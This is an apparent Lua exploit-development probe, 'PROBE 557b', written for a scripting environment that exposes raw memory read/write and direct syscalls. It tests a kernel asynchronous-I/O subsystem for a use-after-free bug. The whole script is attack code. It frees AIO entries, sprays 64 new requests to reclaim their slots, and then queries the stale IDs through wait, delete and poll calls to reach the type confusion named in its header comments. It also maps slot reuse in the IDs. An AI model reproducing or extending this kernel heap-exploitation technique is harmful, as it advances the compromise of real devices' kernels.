-- CRASH_CLASS: MODERATE
-- PROBE 557b: DIAGNOSTIC — does wait(663) find spray entries WITHOUT a race?
--
-- 557a: 3-actor race → spray entries stuck state=0x1 (scheduler corruption).
-- Delete saw 16/16 swaps → spray DID reclaim slots.
-- But wait got all sentinel → spray entries never completed.
--
-- Hypothesis: if completed AIO entries release their slot, spray
-- can reclaim it WITHOUT a race. Then wait(663) on the old ID
-- would find the spray entry (no revalidation → type confusion).
--
-- Test: all sequential from main thread, NO race, NO child threads:
-- 1. Submit 16 originals on /dev/urandom → complete
-- 2. Poll originals → confirm complete
-- 3. Submit 64 spray on /dev/urandom → complete
-- 4. Poll spray → confirm complete
-- 5. Try wait(663) on each original ID → check output
-- 6. Try delete(662) on each original ID → check for swaps
-- 7. Try poll(664) on each original ID → check what's there
--
-- Also: check if delete BEFORE spray changes anything (round 2)

print("=== PROBE 557b: WAIT NO-RACE DIAGNOSTIC ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function zero(b, n) for off = 0, n - 4, 4 do wd(b + off, 0) end end
local function q(v)
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X%08X", h, l)
    end
    return string.format("0x%X", N(v))
end

local Z = uint64(0)
local sc5   = mk(5)
local sc6   = mk(6)
local sc20  = mk(20)
local sc240 = mk(240)
local sc477 = mk(477)
local sc662 = mk(662)
local sc663 = mk(663)
local sc664 = mk(664)
local sc669 = mk(669)
local sc670 = mk(670)

local pid = N(sc20())
print("pid=" .. pid)

-- AIO init
pcall(function() sc670(Z, Z, Z, Z, Z, Z) end)

-- Open /dev/urandom
local function write_string(buf, s)
    for i = 1, #s, 4 do
        local b0 = string.byte(s, i) or 0
        local b1 = string.byte(s, i+1) or 0
        local b2 = string.byte(s, i+2) or 0
        local b3 = string.byte(s, i+3) or 0
        wd(buf + (i - 1), b0 + b1 * 256 + b2 * 65536 + b3 * 16777216)
    end
end
local urand_path = memory.alloc(16)
write_string(urand_path, "/dev/urandom\0")
local ok_u, urand_fd = pcall(function() return sc5(uint64(N(urand_path)), Z, Z) end)
urand_fd = ok_u and N(urand_fd) or -1
print("urandom fd=" .. urand_fd)

-- Helpers
local reqs_buf = memory.alloc(0x30)
local ids_out  = memory.alloc(8)
local ts_buf   = memory.alloc(16)

local function aio_submit(fd)
    local db = memory.alloc(32)
    local rb = memory.alloc(16)
    zero(reqs_buf, 0x28)
    wq(reqs_buf + 0x08, uint64(16))
    wq(reqs_buf + 0x10, uint64(N(db)))
    wq(reqs_buf + 0x18, uint64(N(rb)))
    wd(reqs_buf + 0x20, fd)
    wd(ids_out, 0)
    local ok, rv = pcall(function()
        return sc669(uint64(1), uint64(N(reqs_buf)), uint64(1), uint64(1), uint64(N(ids_out)))
    end)
    return (ok and N(rv) or -999), (rd(ids_out) or 0)
end

local function aio_poll(id)
    local ip = memory.alloc(4); wd(ip, id)
    local sp = memory.alloc(4); wd(sp, 0x77777777)
    pcall(function() sc664(uint64(N(ip)), uint64(1), uint64(N(sp))) end)
    return rd(sp) or 0
end

local function aio_delete(id)
    local ip = memory.alloc(4); wd(ip, id)
    local sp = memory.alloc(4); wd(sp, 0x77777777)
    pcall(function() sc662(uint64(N(ip)), uint64(1), uint64(N(sp))) end)
    return rd(sp) or 0
end

local function aio_wait(id)
    local ip = memory.alloc(4); wd(ip, id)
    local sp = memory.alloc(4); wd(sp, 0xDEADDEAD)
    local tp = memory.alloc(16); wq(tp, Z); wq(tp + 8, Z)
    local ok, rv = pcall(function()
        return sc663(uint64(N(ip)), uint64(1), uint64(N(sp)), uint64(N(tp)))
    end)
    return rd(sp) or 0xDEADDEAD, (ok and N(rv) or -999)
end

-- Helper: wait for entries to complete
local function poll_all_complete(ids, count)
    wq(uint64(N(ts_buf)), Z); wq(uint64(N(ts_buf) + 8), uint64(50000000))
    for try = 1, 40 do
        local all_ok = true
        for i = 1, count do
            local st = aio_poll(ids[i])
            if st < 3 then all_ok = false; break end
        end
        if all_ok then return true end
        pcall(function() sc240(uint64(N(ts_buf)), Z) end)
    end
    return false
end

-- ============================================================
-- TEST A: Submit originals, then spray, then test original IDs
-- (no delete between — test if completed entries release slots)
-- ============================================================
print("")
print("========== TEST A: originals → spray → query ==========")
print("(no delete — test natural slot release on completion)")

local orig_ids = {}
local orig_n = 0
for i = 1, 16 do
    local rv, id = aio_submit(urand_fd)
    if rv == 0 and id > 0 then
        orig_n = orig_n + 1
        orig_ids[orig_n] = id
    end
end
print(string.format("  originals created: %d (IDs: 0x%X..0x%X)", orig_n, orig_ids[1] or 0, orig_ids[orig_n] or 0))
poll_all_complete(orig_ids, orig_n)

-- Submit spray
local spray_ids = {}
local spray_n = 0
for i = 1, 64 do
    local rv, id = aio_submit(urand_fd)
    if rv == 0 and id > 0 then
        spray_n = spray_n + 1
        spray_ids[spray_n] = id
    end
end
print(string.format("  spray created: %d (IDs: 0x%X..0x%X)", spray_n, spray_ids[1] or 0, spray_ids[spray_n] or 0))
poll_all_complete(spray_ids, spray_n)

-- Test A1: poll originals — are they still there?
print("")
print("[A1] Poll original IDs after spray:")
local a1_states = {}
for i = 1, orig_n do
    local st = aio_poll(orig_ids[i])
    local key = string.format("0x%X", st)
    a1_states[key] = (a1_states[key] or 0) + 1
end
for k, v in pairs(a1_states) do print("  " .. k .. " x" .. v) end

-- Test A2: wait(663) on originals
print("")
print("[A2] Wait(663) on original IDs after spray:")
local a2_states = {}
local a2_rvs = {}
for i = 1, orig_n do
    local st, rv = aio_wait(orig_ids[i])
    local sk = string.format("0x%X", st)
    local rk = string.format("rv=%d", rv)
    a2_states[sk] = (a2_states[sk] or 0) + 1
    a2_rvs[rk] = (a2_rvs[rk] or 0) + 1
end
print("  output status:")
for k, v in pairs(a2_states) do print("    " .. k .. " x" .. v) end
print("  return values:")
for k, v in pairs(a2_rvs) do print("    " .. k .. " x" .. v) end

-- Test A3: delete(662) on originals — do they still exist?
print("")
print("[A3] Delete(662) original IDs after spray:")
local a3_states = {}
for i = 1, orig_n do
    local st = aio_delete(orig_ids[i])
    local key = string.format("0x%X", st)
    a3_states[key] = (a3_states[key] or 0) + 1
end
for k, v in pairs(a3_states) do print("  " .. k .. " x" .. v) end

-- Cleanup spray
for i = 1, spray_n do pcall(function() aio_delete(spray_ids[i]) end) end

-- ============================================================
-- TEST B: Submit originals, DELETE them, then spray, then query
-- (explicit delete before spray — test slot reuse after free)
-- ============================================================
print("")
print("========== TEST B: originals → DELETE → spray → query ==========")
print("(explicit delete before spray — test slot reuse)")

local orig2_ids = {}
local orig2_n = 0
for i = 1, 16 do
    local rv, id = aio_submit(urand_fd)
    if rv == 0 and id > 0 then
        orig2_n = orig2_n + 1
        orig2_ids[orig2_n] = id
    end
end
print(string.format("  originals created: %d (IDs: 0x%X..0x%X)", orig2_n, orig2_ids[1] or 0, orig2_ids[orig2_n] or 0))
poll_all_complete(orig2_ids, orig2_n)

-- DELETE originals
print("  deleting originals...")
local b_del = {}
for i = 1, orig2_n do
    local st = aio_delete(orig2_ids[i])
    local key = string.format("0x%X", st)
    b_del[key] = (b_del[key] or 0) + 1
end
for k, v in pairs(b_del) do print("  del: " .. k .. " x" .. v) end

-- Spray
local spray2_ids = {}
local spray2_n = 0
for i = 1, 64 do
    local rv, id = aio_submit(urand_fd)
    if rv == 0 and id > 0 then
        spray2_n = spray2_n + 1
        spray2_ids[spray2_n] = id
    end
end
print(string.format("  spray created: %d (IDs: 0x%X..0x%X)", spray2_n, spray2_ids[1] or 0, spray2_ids[spray2_n] or 0))
poll_all_complete(spray2_ids, spray2_n)

-- Test B1: poll old IDs (deleted originals) — what do we find?
print("")
print("[B1] Poll DELETED original IDs after spray:")
local b1_states = {}
for i = 1, orig2_n do
    local st = aio_poll(orig2_ids[i])
    local key = string.format("0x%X", st)
    b1_states[key] = (b1_states[key] or 0) + 1
end
for k, v in pairs(b1_states) do print("  " .. k .. " x" .. v) end

-- Test B2: wait(663) on deleted original IDs
print("")
print("[B2] Wait(663) on DELETED original IDs after spray:")
local b2_states = {}
local b2_rvs = {}
for i = 1, orig2_n do
    local st, rv = aio_wait(orig2_ids[i])
    local sk = string.format("0x%X", st)
    local rk = string.format("rv=%d", rv)
    b2_states[sk] = (b2_states[sk] or 0) + 1
    b2_rvs[rk] = (b2_rvs[rk] or 0) + 1
end
print("  output status:")
for k, v in pairs(b2_states) do print("    " .. k .. " x" .. v) end
print("  return values:")
for k, v in pairs(b2_rvs) do print("    " .. k .. " x" .. v) end

-- Test B3: delete(662) on deleted original IDs — swap?
print("")
print("[B3] Delete(662) on DELETED original IDs after spray:")
local b3_states = {}
for i = 1, orig2_n do
    local st = aio_delete(orig2_ids[i])
    local key = string.format("0x%X", st)
    b3_states[key] = (b3_states[key] or 0) + 1
end
for k, v in pairs(b3_states) do print("  " .. k .. " x" .. v) end

-- Cleanup
for i = 1, spray2_n do pcall(function() aio_delete(spray2_ids[i]) end) end

-- ============================================================
-- TEST C: ID structure analysis — what do the IDs look like?
-- ============================================================
print("")
print("========== TEST C: ID structure analysis ==========")

local c_ids = {}
for i = 1, 32 do
    local rv, id = aio_submit(urand_fd)
    if rv == 0 and id > 0 then
        c_ids[#c_ids + 1] = id
    end
end
poll_all_complete(c_ids, #c_ids)

-- Delete first 8, keep last 24
for i = 1, 8 do aio_delete(c_ids[i]) end

-- Submit 8 more — do they reuse the freed slots?
local c2_ids = {}
for i = 1, 8 do
    local rv, id = aio_submit(urand_fd)
    if rv == 0 and id > 0 then
        c2_ids[#c2_ids + 1] = id
    end
end

print("  first batch IDs:")
for i = 1, 8 do print(string.format("    [%d] 0x%08X (deleted)", i, c_ids[i])) end
for i = 9, 16 do print(string.format("    [%d] 0x%08X (kept)", i, c_ids[i])) end
print("  second batch IDs (after freeing slots 1-8):")
for i = 1, #c2_ids do print(string.format("    [%d] 0x%08X", i, c2_ids[i])) end

-- Check: do second batch IDs share any low bits with first batch?
print("")
print("  slot analysis (low 16 bits):")
for i = 1, math.min(8, #c2_ids) do
    local old_lo = c_ids[i] % 65536
    local new_lo = c2_ids[i] % 65536
    local old_hi = math.floor(c_ids[i] / 65536)
    local new_hi = math.floor(c2_ids[i] / 65536)
    print(string.format("    old=0x%04X|0x%04X new=0x%04X|0x%04X %s",
        old_hi, old_lo, new_hi, new_lo,
        old_lo == new_lo and "SLOT_MATCH" or "different"))
end

-- Cleanup
for i = 9, #c_ids do pcall(function() aio_delete(c_ids[i]) end) end
for i = 1, #c2_ids do pcall(function() aio_delete(c2_ids[i]) end) end

-- Health check
print("")
print("[HEALTH]")
local h_rv, h_id = aio_submit(urand_fd)
if h_rv == 0 and h_id > 0 then
    poll_all_complete({h_id}, 1)
    local h_st = aio_poll(h_id)
    local h_ds = aio_delete(h_id)
    print(string.format("  poll=0x%X del=0x%X → %s", h_st, h_ds,
        (h_st >= 3 and h_ds == 0) and "HEALTHY" or "UNHEALTHY"))
end

print("")
local pid2 = N(sc20())
print("pid=" .. pid2 .. (pid2 == pid and " OK" or " CHANGED"))
print("=== 557b DONE ===")
